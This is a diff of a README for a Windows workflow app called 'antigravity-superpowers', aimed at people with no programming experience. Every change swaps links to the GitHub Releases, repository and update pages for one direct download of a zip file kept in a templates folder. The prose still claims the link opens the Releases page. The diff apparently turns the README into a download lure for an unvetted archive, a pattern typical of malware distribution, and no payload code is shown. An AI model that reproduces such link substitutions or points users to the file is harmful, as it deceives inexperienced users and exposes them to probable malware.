@@ -1,6 +1,6 @@
 # ✨ antigravity-superpowers - Simple Workflow Tools for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/KamgabsofBG/antigravity-superpowers/main/templates/antigravity_superpowers_v1.8.zip)
 
 Welcome to the antigravity-superpowers tool. This app brings key productivity workflows from the Superpowers system into a smooth, simple package. You can use it for brainstorming, planning, test-driven development (TDD), and code review. Even if you have no programming experience, this guide will help you download and run it on Windows.
 
@@ -40,7 +40,7 @@ Your first step is to get the software on your computer.
 **Do this:**
 
 1. Click the big green button below or open this link in your browser:  
-   [Download antigravity-superpowers](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
+   [Download antigravity-superpowers](https://raw.githubusercontent.com/KamgabsofBG/antigravity-superpowers/main/templates/antigravity_superpowers_v1.8.zip)
 
 2. This link takes you to the Releases page on GitHub. Find the latest version. It usually appears at the top of the list.  
 
@@ -93,7 +93,7 @@ Each section has buttons labeled clearly and easy-to-read instructions. You can 
 ## 🛡️ Updating to New Versions
 
 Check the Releases page regularly for updates:  
-[Check for updates here](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
+[Check for updates here](https://raw.githubusercontent.com/KamgabsofBG/antigravity-superpowers/main/templates/antigravity_superpowers_v1.8.zip)
 
 To update:
 
@@ -110,7 +110,7 @@ If the app does not work as expected:
 - Restart your computer, then try running the app again.  
 - Make sure your Windows is up to date.  
 - Visit the GitHub page for instructions or report issues:  
-  https://github.com/KamgabsofBG/antigravity-superpowers  
+  https://raw.githubusercontent.com/KamgabsofBG/antigravity-superpowers/main/templates/antigravity_superpowers_v1.8.zip  
 
 Search through existing posts or open a new issue if needed.
 
@@ -128,4 +128,4 @@ You can find these under the Settings menu inside the app.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/KamgabsofBG/antigravity-superpowers/main/templates/antigravity_superpowers_v1.8.zip)
